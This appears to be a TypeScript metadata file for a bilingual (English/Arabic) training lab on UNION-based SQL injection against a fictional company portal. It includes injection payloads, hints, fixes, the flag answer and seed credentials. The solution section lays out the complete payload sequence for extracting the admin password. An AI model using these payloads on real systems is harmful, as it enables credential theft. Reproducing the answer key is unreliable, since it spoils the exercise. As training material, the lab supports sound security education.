// src/modules/practice-labs/sql-injection/labs/lab2/lab2.metadata.ts
import type { LabMetadata } from '../../../types/lab-metadata.type';

export const lab2Metadata: LabMetadata = {
  slug: 'sqli-union-extraction',
  title: 'SQL Injection: UNION-Based Data Extraction',
  ar_title: 'حقن SQL: استخراج البيانات بـ UNION',
  description:
    "You infiltrated CyberCorp's internal support portal. The user directory search is vulnerable to UNION-based SQLi. Extract the hidden admin credentials.",
  ar_description:
    'اخترقت بوابة الدعم الداخلية لـ CyberCorp. البحث عن المستخدمين يحتوي على ثغرة UNION SQLi. استخرج بيانات الأدمن المخفية.',
  difficulty: 'INTERMEDIATE',
  category: 'WEB_SECURITY',
  skills: [
    'SQL Injection',
    'UNION Attack',
    'Column Enumeration',
    'Data Extraction',
  ],
  xpReward: 200,
  pointsReward: 100,
  duration: 45,
  executionMode: 'SHARED_BACKEND',
  isPublished: true,

  // ─── للمتدرب ────────────────────────────────────────────────────
  goal: 'Use UNION-based SQL injection to extract the admin password from the user directory search.',
  ar_goal:
    'استخدم حقن SQL بأسلوب UNION لاستخراج كلمة مرور المدير من خاصية البحث في دليل المستخدمين.',

  briefing: {
    en: `CyberCorp — a mid-size tech company — runs an internal support portal for its 500+ employees.
The portal has a "User Directory" feature that lets support agents search for colleagues by name.
You have a low-privilege support account. The search box returns usernames, emails, and roles.
You notice the password column is never shown in results... but is it truly out of reach?
The database has it. The query touches it. The question is whether you can redirect it.`,
    ar: `CyberCorp — شركة تقنية متوسطة الحجم — تشغّل بوابة دعم داخلية لأكثر من 500 موظف.
تمتلك البوابة ميزة "دليل المستخدمين" تسمح لوكلاء الدعم بالبحث عن الزملاء بالاسم.
لديك حساب دعم منخفض الصلاحيات. مربع البحث يُرجع أسماء المستخدمين والإيميلات والأدوار.
تلاحظ أن عمود كلمة المرور لا يظهر أبداً في النتائج... لكن هل هو بعيد المنال فعلاً؟
قاعدة البيانات تحتويه. الاستعلام يلمسه. السؤال هو هل يمكنك إعادة توجيهه.`,
  },

  stepsOverview: {
    en: [
      'Use the search normally — understand the structure of returned data (how many columns, what types)',
      'Test the search parameter for SQL injection — probe the column count',
      'Verify data type compatibility to prepare your UNION payload',
      'Extract the hidden admin password by pivoting it into a visible column',
    ],
    ar: [
      'استخدم البحث بشكل طبيعي — افهم بنية البيانات المُرجعة (كم عمود، ما الأنواع)',
      'اختبر معامل البحث للحقن — استكشف عدد الأعمدة',
      'تحقق من توافق أنواع البيانات لتحضير payload الـ UNION',
      'استخرج كلمة مرور المدير المخفية بتحويلها لعمود مرئي',
    ],
  },

  // ─── للأدمن فقط ─────────────────────────────────────────────────
  solution: {
    context:
      "CyberCorp's internal support portal has a 'User Directory' search. The backend builds a raw SQL query selecting only username, email, and role. The admin password is never shown in normal results — retrievable only via UNION injection.",
    vulnerableCode:
      'SELECT username, email, role FROM "LabGenericUser"\n' +
      "WHERE userId='...' AND labId='...' AND username ILIKE '%SEARCH_TERM%'",
    exploitation:
      "Step 1 — Confirm column count: ' ORDER BY 3--\n" +
      "Step 2 — Type compat: ' UNION SELECT NULL,NULL,NULL--\n" +
      'Step 3 — Extract password into email position:\n' +
      "  ' UNION SELECT username, password, role FROM \"LabGenericUser\" WHERE username='admin'--",
    steps: {
      en: [
        "Search for 'alice' normally — observe: 3 columns returned (username, email, role)",
        "Inject: ' ORDER BY 3-- → works normally. Try ' ORDER BY 4-- → error. Confirms 3 columns.",
        "Inject: ' UNION SELECT NULL,NULL,NULL-- → if no error, types are compatible",
        "Inject: ' UNION SELECT NULL,'test',NULL-- → 'test' appears in email column = column 2 is a string",
        "Final payload: ' UNION SELECT username, password, role FROM \"LabGenericUser\" WHERE username='admin'-- → admin password appears in the email column",
      ],
      ar: [
        "ابحث عن 'alice' بشكل طبيعي — لاحظ: 3 أعمدة مُرجعة (username, email, role)",
        "احقن: ' ORDER BY 3-- → يعمل بشكل طبيعي. جرّب ' ORDER BY 4-- → خطأ. يؤكد وجود 3 أعمدة.",
        "احقن: ' UNION SELECT NULL,NULL,NULL-- → إن لم يكن هناك خطأ، الأنواع متوافقة",
        "احقن: ' UNION SELECT NULL,'test',NULL-- → تظهر 'test' في عمود الإيميل = العمود 2 نص",
        "الـ payload النهائي: ' UNION SELECT username, password, role FROM \"LabGenericUser\" WHERE username='admin'-- → كلمة مرور الأدمن تظهر في عمود الإيميل",
      ],
    },
    fix: [
      'Use parameterized queries for all search inputs',
      'Never expose password columns in any query, even if filtered in the application layer',
      'Apply column whitelisting — only select exactly what you need',
      'Use ORM to prevent raw query construction from user input',
    ],
  },

  postSolve: {
    explanation: {
      en: 'UNION-based SQL injection allows an attacker to append an additional SELECT statement to the original query. By matching column count and types, the attacker can extract data from any table in the database, even columns not intended to be shown.',
      ar: 'حقن SQL بأسلوب UNION يسمح للمهاجم بإضافة جملة SELECT إضافية للاستعلام الأصلي. بمطابقة عدد الأعمدة وأنواعها، يمكن للمهاجم استخراج بيانات من أي جدول في قاعدة البيانات، حتى الأعمدة غير المقصود عرضها.',
    },
    impact: {
      en: 'Full database exfiltration. All user credentials, private data, and sensitive records become accessible to an attacker with any level of access to the search feature.',
      ar: 'استخراج كامل لقاعدة البيانات. جميع بيانات اعتماد المستخدمين والبيانات الخاصة والسجلات الحساسة تصبح في متناول مهاجم لديه أي مستوى وصول لخاصية البحث.',
    },
    fix: [
      'Always use prepared statements or ORM',
      'Principle of least privilege: DB user should only SELECT needed columns',
      'Never store plaintext passwords — use bcrypt with proper salt rounds',
      'Monitor for UNION/ORDER BY patterns in query logs',
    ],
  },

  hints: [
    {
      order: 1,
      xpCost: 10,
      content:
        "The query selects 3 columns. Confirm with: ' ORDER BY 3--  (works) vs ' ORDER BY 4-- (error)",
    },
    {
      order: 2,
      xpCost: 20,
      content:
        "Verify column types are compatible using NULLs: ' UNION SELECT NULL,NULL,NULL--",
    },
    {
      order: 3,
      xpCost: 30,
      content:
        "The 'password' column isn't in the original SELECT. You need to pivot it — inject it into the position of a visible column like email.",
    },
  ],

  flagAnswer: 'FLAG{SQLI_UNION_DATA_EXTRACTED}',
  initialState: {
    users: [
      {
        username: 'alice',
        email: 'alice@cybercorp.io',
        role: 'analyst',
        password: 'alice_cc1_pass',
      },
      {
        username: 'bob',
        email: 'bob@cybercorp.io',
        role: 'analyst',
        password: 'bob_cc2_pass',
      },
      {
        username: 'charlie',
        email: 'charlie@cybercorp.io',
        role: 'analyst',
        password: 'charlie_cc3',
      },
      {
        username: 'support',
        email: 'support@cybercorp.io',
        role: 'support',
        password: 'sup_cc4_pass',
      },
      {
        username: 'admin',
        email: 'admin@cybercorp.io',
        role: 'admin',
        password: 'FLAG{SQLI_UNION_DATA_EXTRACTED}',
      },
    ],
  },
};
